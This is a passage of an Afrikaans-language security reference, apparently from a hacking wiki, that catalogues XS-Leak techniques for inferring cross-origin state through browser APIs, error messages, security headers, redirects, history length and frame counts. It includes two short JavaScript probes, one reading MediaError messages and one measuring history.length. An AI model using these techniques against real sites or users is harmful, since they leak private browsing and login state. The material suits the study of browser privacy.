- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: Bladsy Inhoud
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Samevatting:** Deur die XSS Auditor in Sekuriteits Aserte te gebruik, kan aanvallers spesifieke webblad elemente detecteer deur veranderinge in antwoorde waar te neem wanneer vervaardigde payloads die auditor se filtreringsmeganisme aktiveer.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

In Sekuriteits Aserte (SA), kan die XSS Auditor, oorspronklik bedoel om Cross-Site Scripting (XSS) aanvalle te voorkom, ironies benut word om sensitiewe inligting te lek. Alhoewel hierdie ingeboude kenmerk uit Google Chrome (GC) verwyder is, is dit steeds teenwoordig in SA. In 2013 het Braun en Heiderich getoon dat die XSS Auditor per ongeluk wettige skripte kan blokkeer, wat tot vals positiewe lei. Gebaseer op hierdie, het navorsers tegnieke ontwikkel om inligting te onttrek en spesifieke inhoud op kruis-oorsprong bladsye te detecteer, 'n konsep bekend as XS-Leaks, aanvanklik gerapporteer deur Terada en verder uitgewerk deur Heyes in 'n blogpos. Alhoewel hierdie tegnieke spesifiek vir die XSS Auditor in GC was, is daar ontdek dat in SA, bladsye wat deur die XSS Auditor geblokkeer word, nie inskrywings in die Prestasie API genereer nie, wat 'n metode onthul waardeur sensitiewe inligting steeds gelekt kan word.

### X-Frame Lek

- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: Header
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Samevatting:** Hulpbron met X-Frame-Options header skep nie hulpbron tydsberekening inskrywing nie.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

As 'n bladsy **nie toegelaat** word om in 'n **iframe** **gerender** te word nie, sal dit **nie 'n prestasie inskrywing** skep nie. As gevolg hiervan kan 'n aanvaller die antwoordheader **`X-Frame-Options`** detecteer.\
Dieselfde gebeur as jy 'n **embed** **etiket** gebruik.

### Aflaai Detectie

- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: Header
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Samevatting:** Aflaaie skep nie hulpbron tydsberekening inskrywings in die Prestasie API nie.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Soortgelyk aan die XS-Lek wat beskryf is, 'n **hulpbron wat afgelaai** word as gevolg van die ContentDisposition header, skep ook **nie 'n prestasie inskrywing** nie. Hierdie tegniek werk in alle groot browers.

### Oorplasing Begin Lek

- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: Oorplasing
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Samevatting:** Hulpbron tydsberekening inskrywing lek die begin tyd van 'n oorplasing.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Ons het een XS-Lek geval gevind wat die gedrag van sommige browers misbruik wat te veel inligting vir kruis-oorsprong versoeke log. Die standaard definieer 'n substel van eienskappe wat op nul gestel moet word vir kruis-oorsprong hulpbronne. Tog, in **SA** is dit moontlik om te detecteer of die gebruiker **oorplaas** is deur die teikenbladsy, deur die **Prestasie API** te ondervra en te kyk vir die **redirectStart tydsdata**.

### Duur Oorplasing Lek

- **Insluitingsmetodes**: Fetch API
- **Waarneembare Verskil**: Oorplasing
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Samevatting:** Die duur van tydsberekening inskrywings is negatief wanneer 'n oorplasing plaasvind.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

In GC, is die **duur** vir versoeke wat in 'n **oorplasing** eindig **negatief** en kan dus **onderskei** word van versoeke wat nie in 'n oorplasing eindig nie.

### CORP Lek

- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: Header
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Samevatting:** Hulpbron wat met CORP beskerm word, skep nie hulpbron tydsberekening inskrywings nie.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

In sommige gevalle kan die **nextHopProtocol inskrywing** as 'n lek tegniek gebruik word. In GC, wanneer die **CORP header** gestel is, sal die nextHopProtocol **leeg** wees. Let daarop dat SA glad nie 'n prestasie inskrywing vir CORP-geaktiveerde hulpbronne sal genereer nie.

### Dienswerker

- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: API Gebruik
- **Meer inligting**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Samevatting:** Detecteer of 'n dienswerker geregistreer is vir 'n spesifieke oorsprong.
- **Kode Voorbeeld**:

Dienswerkers is gebeurtenis-gedrewe skrip konteks wat by 'n oorsprong loop. Hulle loop in die agtergrond van 'n webblad en kan hulpbronne onderskep, wysig, en **kas** om offline webtoepassings te skep.\
As 'n **hulpbron wat in 'n **dienswerker** kas** gestoor is, via **iframe** toeganklik gemaak word, sal die hulpbron **uit die dienswerker kas gelaai** word.\
Om te detecteer of die hulpbron **uit die dienswerker** kas gelaai is, kan die **Prestasie API** gebruik word.\
Dit kan ook gedoen word met 'n Tydsaanval (kyk die papier vir meer inligting).

### Kas

- **Insluitingsmetodes**: Fetch API
- **Waarneembare Verskil**: Tydsberekening
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Samevatting:** Dit is moontlik om te kyk of 'n hulpbron in die kas gestoor is.
- **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

Deur die [Prestasie API](xs-search.md#performance-api) is dit moontlik om te kyk of 'n hulpbron in die kas gestoor is.

### Netwerk Duur

- **Insluitingsmetodes**: Fetch API
- **Waarneembare Verskil**: Bladsy Inhoud
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **Samevatting:** Dit is moontlik om die netwerkduur van 'n versoek van die `prestasie` API te verkry.
- **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Foutboodskappe Tegniek

### Media Fout

- **Insluitingsmetodes**: HTML Elemente (Video, Audio)
- **Waarneembare Verskil**: Statuskode
- **Meer inligting**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **Samevatting:** In Firefox is dit moontlik om akkuraat 'n kruis-oorsprong versoek se statuskode te lek.
- **Kode Voorbeeld**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
Die `MediaError` koppelvlak se boodskap eienskap identifiseer uniek hulpbronne wat suksesvol laai met 'n unieke string. 'n Aanvaller kan hierdie kenmerk benut deur die boodskapinhoud te observeer, en sodoende die responsstatus van 'n kruis-oorsprong hulpbron af te lei.

### CORS Fout

- **Insluitingsmetodes**: Fetch API
- **Waarneembare Verskil**: Kop
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Opsomming:** In Veiligheidsbevestigings (SA) stel CORS foutboodskappe onbedoeld die volle URL van omgeleide versoeke bloot.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Hierdie tegniek stel 'n aanvaller in staat om **die bestemming van 'n kruis-oorsprong webwerf se omleiding te onttrek** deur te benut hoe Webkit-gebaseerde blaaiers CORS versoeke hanteer. Spesifiek, wanneer 'n **CORS-geaktiveerde versoek** na 'n teikenwebwerf gestuur word wat 'n omleiding op grond van gebruikersstatus uitreik en die blaaiers die versoek daarna ontken, word die **volle URL van die omleiding se teiken** binne die foutboodskap bekendgemaak. Hierdie kwesbaarheid onthul nie net die feit van die omleiding nie, maar stel ook die omleiding se eindpunt en enige **sensitiewe navraagparameters** wat dit mag bevat, bloot.

### SRI Fout

- **Insluitingsmetodes**: Fetch API
- **Waarneembare Verskil**: Kop
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Opsomming:** In Veiligheidsbevestigings (SA) stel SRI foutboodskappe onbedoeld die volle URL van omgeleide versoeke bloot.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

'n Aanvaller kan **uitgebreide foutboodskappe** benut om die grootte van kruis-oorsprong antwoorde af te lei. Dit is moontlik as gevolg van die meganisme van Subresource Integrity (SRI), wat die integriteitseienskap gebruik om te verifieer dat hulpbronne wat gewoonlik van CDN's af verkry word, nie gemanipuleer is nie. Vir SRI om op kruis-oorsprong hulpbronne te werk, moet hierdie **CORS-geaktiveerd** wees; anders is hulle nie onderhewig aan integriteitskontroles nie. In Veiligheidsbevestigings (SA), net soos die CORS fout XS-Leak, kan 'n foutboodskap vasgevang word nadat 'n fetch versoek met 'n integriteitseienskap misluk. Aanvallers kan doelbewus **hierdie fout veroorsaak** deur 'n **vals hash waarde** aan die integriteitseienskap van enige versoek toe te ken. In SA onthul die resulterende foutboodskap onbedoeld die inhoudslengte van die aangevraagde hulpbron. Hierdie inligtingslek stel 'n aanvaller in staat om variasies in responsgrootte te onderskei, wat die weg baan vir gesofistikeerde XS-Leak aanvalle.

### CSP Oortreding/Detectie

- **Insluitingsmetodes**: Pop-ups
- **Waarneembare Verskil**: Statuskode
- **Meer inligting**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **Opsomming:** As slegs die slagoffer se webwerf in die CSP toegelaat word, en ons probeer om dit na 'n ander domein te herlei, sal die CSP 'n waarneembare fout veroorsaak.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

'n XS-Leak kan die CSP gebruik om te detecteer of 'n kruis-oorsprong webwerf na 'n ander oorsprong omgeleide is. Hierdie lek kan die omleiding opspoor, maar addisioneel, die domein van die omleidingsteiken lek. Die basiese idee van hierdie aanval is om **die teikendomein op die aanvaller se webwerf toe te laat**. Sodra 'n versoek na die teikendomein uitgereik word, **herlei** dit na 'n kruis-oorsprong domein. **CSP blokkeer** die toegang daartoe en skep 'n **oortredingsverslag wat as 'n lek tegniek gebruik word**. Afhangende van die blaaier, **kan hierdie verslag die teikensite van die omleiding lek**.\
Moderne blaaiers sal nie die URL aandui waarheen dit omgeleide is nie, maar jy kan steeds opspoor dat 'n kruis-oorsprong omleiding geaktiveer is.

### Cache

- **Insluitingsmetodes**: Frames, Pop-ups
- **Waarneembare Verskil**: Bladsy-inhoud
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **Opsomming:** Verwyder die lêer uit die cache. Open die teikenbladsy en kyk of die lêer in die cache teenwoordig is.
- **Kode Voorbeeld:**

Blaaiers kan een gedeelde cache vir alle webwerwe gebruik. Ongeag hul oorsprong, is dit moontlik om af te lei of 'n teikenbladsy 'n **spesifieke lêer aangevra het**.

As 'n bladsy 'n beeld laai slegs as die gebruiker ingelog is, kan jy die **hulpbron ongeldig maak** (sodat dit nie meer in die cache is as dit was, sien meer inligting skakels nie), **'n versoek uitvoer** wat daardie hulpbron kan laai en probeer om die hulpbron **met 'n slegte versoek** te laai (bv. deur 'n te lang verwysingskop te gebruik). As die hulpbron laai **nie enige fout geaktiveer het nie**, is dit omdat dit **in die cache was**.

### CSP Riglyn

- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: Kop
- **Meer inligting**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **Opsomming:** CSP kop riglyne kan ondersoek word met die CSP iframe eienskap, wat beleidsbesonderhede onthul.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

'n Nuwe kenmerk in Google Chrome (GC) laat webbladsye toe om **'n Inhoudsekuriteitsbeleid (CSP) voor te stel** deur 'n eienskap op 'n iframe element in te stel, met beleidsriglyne wat saam met die HTTP versoek oorgedra word. Normaalweg moet die ingebedde inhoud **dit via 'n HTTP-kop goedkeur**, of 'n **foutbladsy word vertoon**. As die iframe egter reeds deur 'n CSP beheer word en die nuut voorgestelde beleid nie meer beperkend is nie, sal die bladsy normaal laai. Hierdie meganisme open 'n pad vir 'n aanvaller om **spesifieke CSP riglyne** van 'n kruis-oorsprong bladsy te detecteer deur die foutbladsy te identifiseer. Alhoewel hierdie kwesbaarheid as reggestel gemerk is, onthul ons bevindings 'n **nuwe lek tegniek** wat in staat is om die foutbladsy te detecteer, wat daarop dui dat die onderliggende probleem nooit ten volle aangespreek is nie.

### **CORP**

- **Insluitingsmetodes**: Fetch API
- **Waarneembare Verskil**: Kop
- **Meer inligting**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **Opsomming:** Hulpbronne wat beveilig is met die Cross-Origin Resource Policy (CORP) sal 'n fout gooi wanneer dit van 'n nie-toegestane oorsprong af verkry word.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

Die CORP-kop is 'n relatief nuwe webplatform sekuriteitskenmerk wat, wanneer dit ingestel is, **nie-cors kruis-oorsprong versoeke na die gegewe hulpbron blokkeer**. Die teenwoordigheid van die kop kan opgespoor word, want 'n hulpbron wat met CORP beskerm word, sal **'n fout gooi wanneer dit verkry word**.

### CORB

- **Insluitingsmetodes**: HTML Elemente
- **Waarneembare Verskil**: Kop
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **Opsomming**: CORB kan aanvallers toelaat om te detecteer wanneer die **`nosniff` kop teenwoordig is** in die versoek.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Kyk na die skakel vir meer inligting oor die aanval.

### CORS fout op Oorsprong Reflectie miskonfigurasie <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **Insluitingsmetodes**: Fetch API
- **Waarneembare Verskil**: Kop
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **Opsomming**: As die Oorsprong kop in die kop `Access-Control-Allow-Origin` weerspieël word, is dit moontlik om te kyk of 'n hulpbron reeds in die cache is.
- **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

In die geval dat die **Oorsprong kop** in die kop `Access-Control-Allow-Origin` **weerspieël** word, kan 'n aanvaller hierdie gedrag misbruik om te probeer **verkry** die **hulpbron** in **CORS** modus. As 'n **fout** **nie** geaktiveer word nie, beteken dit dat dit **korrek van die web verkry is**, as 'n fout **geaktiveer** word, is dit omdat dit **van die cache** geaccess is (die fout verskyn omdat die cache 'n respons met 'n CORS-kop wat die oorspronklike domein toelaat en nie die aanvaller se domein nie, stoor).\
Let daarop dat as die oorsprong nie weerspieël word nie, maar 'n wildcard gebruik word (`Access-Control-Allow-Origin: *`), dit nie sal werk nie.

## Leesbare Eienskappe Tegniek

### Fetch Omleiding

- **Insluitingsmetodes**: Fetch API
- **Waarneembare Verskil**: Statuskode
- **Meer inligting**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **Opsomming:** GC en SA laat toe om die tipe respons (opaque-redirect) te kontroleer nadat die omleiding voltooi is.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Deur 'n versoek te dien met die Fetch API met `redirect: "manual"` en ander parameters, is dit moontlik om die `response.type` eienskap te lees en as dit gelyk is aan `opaqueredirect`, dan was die respons 'n omleiding.

### COOP

- **Insluitingsmetodes**: Pop-ups
- **Waarneembare Verskil**: Kop
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **Opsomming:** Bladsye wat beskerm word deur die Cross-Origin Opener Policy (COOP) voorkom toegang vanaf kruis-oorsprong interaksies.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

'n Aanvaller is in staat om die teenwoordigheid van die Cross-Origin Opener Policy (COOP) kop in 'n kruis-oorsprong HTTP respons af te lei. COOP word deur webtoepassings gebruik om te verhoed dat eksterne webwerwe willekeurige venster verwysings verkry. Die sigbaarheid van hierdie kop kan opgespoor word deur te probeer om toegang te verkry tot die **`contentWindow` verwysing**. In scenario's waar COOP voorwaardelik toegepas word, word die **`opener` eienskap** 'n duidelike aanduiding: dit is **onbeskikbaar** wanneer COOP aktief is, en **beskikbaar** in sy afwesigheid.

### URL Maks Lengte - Bedienerkant

- **Insluitingsmetodes**: Fetch API, HTML Elemente
- **Waarneembare Verskil**: Statuskode / Inhoud
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **Opsomming:** Detecteer verskille in responsies omdat die omleiding responslengte dalk te groot is dat die bediener met 'n fout terug speel en 'n waarskuwing geaktiveer word.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

As 'n bediener-kant omleiding **gebruikersinvoer binne die omleiding** en **extra data** gebruik. Dit is moontlik om hierdie gedrag te detecteer omdat bedieners gewoonlik 'n **limiet op versoeklengte** het. As die **gebruikersdata** daardie **lengte - 1** is, omdat die **omleiding** **daardie data** gebruik en **iets ekstra** toevoeg, sal dit 'n **fout aktiveer wat via Foutgebeurtenisse opspoorbaar is**.

As jy op een of ander manier koekies aan 'n gebruiker kan stel, kan jy ook hierdie aanval uitvoer deur **voldoende koekies in te stel** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) sodat met die **verhoogde grootte van die respons** van die **korrekte respons** 'n **fout** geaktiveer word. In hierdie geval, onthou dat as jy hierdie versoek vanaf 'n dieselfde webwerf aktiveer, `<script>` outomaties die koekies sal stuur (sodat jy vir foute kan kyk).\
'n Voorbeeld van die **koekie bom + XS-Search** kan gevind word in die Beoogde oplossing van hierdie skrywe: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` of om in dieselfde konteks te wees, is gewoonlik nodig vir hierdie tipe aanval.

### URL Maks Lengte - Kliëntkant

- **Insluitingsmetodes**: Pop-ups
- **Waarneembare Verskil**: Statuskode / Inhoud
- **Meer inligting**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **Opsomming:** Detecteer verskille in responsies omdat die omleiding responslengte dalk te groot is vir 'n versoek dat 'n verskil opgemerk kan word.
- **Kode Voorbeeld**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Volgens [Chromium dokumentasie](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length), is Chrome se maksimum URL-lengte 2MB.

> In die algemeen het die _webplatform_ nie beperkings op die lengte van URL's nie (alhoewel 2^31 'n algemene limiet is). _Chrome_ beperk URL's tot 'n maksimum lengte van **2MB** om praktiese redes en om te verhoed dat ontkenning van diens probleme in inter-proses kommunikasie veroorsaak.

Daarom, as die **omleiding URL** in een van die gevalle groter is, is dit moontlik om dit te laat omlei met 'n **URL groter as 2MB** om die **lengte limiet** te tref. Wanneer dit gebeur, wys Chrome 'n **`about:blank#blocked`** bladsy.

Die **waarneembare verskil** is dat as die **omleiding** voltooi was, `window.origin` 'n **fout** gooi omdat 'n kruis oorsprong nie daardie inligting kan toegang nie. As die **limiet** egter **getref** is en die gelaaide bladsy **`about:blank#blocked`** was, bly die venster se **`origin`** dié van die **ouer**, wat 'n **toeganklike inligting** is.

Al die ekstra inligting wat nodig is om die **2MB** te bereik, kan via 'n **hash** in die aanvanklike URL bygevoeg word sodat dit **in die omleiding gebruik sal word**.

{{#ref}}
xs-search/url-max-length-client-side.md
{{#endref}}

### Maks Omleidings

- **Insluitingsmetodes**: Fetch API, Frames
- **Waarneembare Verskil**: Statuskode
- **Meer inligting**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **Opsomming:** Gebruik die blaaier se omleiding limiet om die voorkoms van URL omleidings te bepaal.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

As die **maks** aantal **omleidings** wat 'n blaaiers kan volg **20** is, kan 'n aanvaller probeer om sy bladsy met **19 omleidings** te laai en uiteindelik die **slagoffer** na die getoetste bladsy te stuur. As 'n **fout** geaktiveer word, dan was die bladsy besig om die **slagoffer te herlei**.

### Geskiedenis Lengte

- **Insluitingsmetodes**: Frames, Pop-ups
- **Waarneembare Verskil**: Omleidings
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **Opsomming:** JavaScript kode manipuleer die blaaiers geskiedenis en kan toegang verkry word deur die lengte eienskap.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Die **Geskiedenis API** laat JavaScript kode toe om die blaaiers geskiedenis te manipuleer, wat **die bladsye wat deur 'n gebruiker besoek is, stoor**. 'n Aanvaller kan die lengte eienskap as 'n insluitingsmetode gebruik: om JavaScript en HTML navigasie te detecteer.\
**Kontroleer `history.length`**, maak 'n gebruiker **navigeer** na 'n bladsy, **verander** dit **terug** na die selfde oorsprong en **kontroleer** die nuwe waarde van **`history.length`**.

### Geskiedenis Lengte met dieselfde URL

- **Insluitingsmetodes**: Frames, Pop-ups
- **Waarneembare Verskil**: As die URL dieselfde is as die geraamde een
- **Opsomming:** Dit is moontlik om te raai of die ligging van 'n raam/pop-up in 'n spesifieke URL is deur die geskiedenis lengte te misbruik.
- **Kode Voorbeeld**: Hieronder

'n Aanvaller kan JavaScript kode gebruik om die **raam/pop-up ligging na 'n geraamde een te manipuleer** en dit **onmiddellik** **na `about:blank` te verander**. As die geskiedenis lengte toeneem, beteken dit die URL was korrek en dit het tyd gehad om **te verhoog omdat die URL nie herlaai word as dit dieselfde is nie**. As dit nie toeneem nie, beteken dit dit **het probeer om die geraamde URL te laai**, maar omdat ons **onmiddellik daarna** **`about:blank`** gelaai het, het die **geskiedenis lengte nooit toegenomen** toe die geraamde url gelaai is.
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Frame Counting

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Summary:** Evalueer die hoeveelheid iframe-elemente deur die `window.length` eienskap te inspekteer.
- **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Tel die **aantal rame in 'n web** wat via `iframe` of `window.open` geopen is, kan help om die **status van die gebruiker oor daardie bladsy** te identifiseer.\
Boonop, as die bladsy altyd dieselfde aantal rame het, kan die **deurlopende** kontrole van die aantal rame help om 'n **patroon** te identifiseer wat inligting kan lek.

'n Voorbeeld van hierdie tegniek is dat in chrome, 'n **PDF** met **rame telling** gedetecteer kan word omdat 'n `embed` intern gebruik word. Daar is [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) wat 'n mate van beheer oor die inhoud toelaat soos `zoom`, `view`, `page`, `toolbar` waar hierdie tegniek interessant kan wees.

### HTMLElements

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Summary:** Lees die gelekte waarde om tussen 2 moontlike toestande te onderskei
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Inligtingslek deur HTML-elemente is 'n bekommernis in webveiligheid, veral wanneer dinamiese media-lêers gegenereer word op grond van gebruikersinligting, of wanneer watermerke bygevoeg word, wat die media-grootte verander. Dit kan deur aanvallers benut word om tussen moontlike toestande te onderskei deur die inligting wat deur sekere HTML-elemente blootgestel word, te analiseer.

### Information Exposed by HTML Elements

- **HTMLMediaElement**: Hierdie element onthul die media se `duration` en `buffered` tye, wat via sy API verkry kan word. [Read more about HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
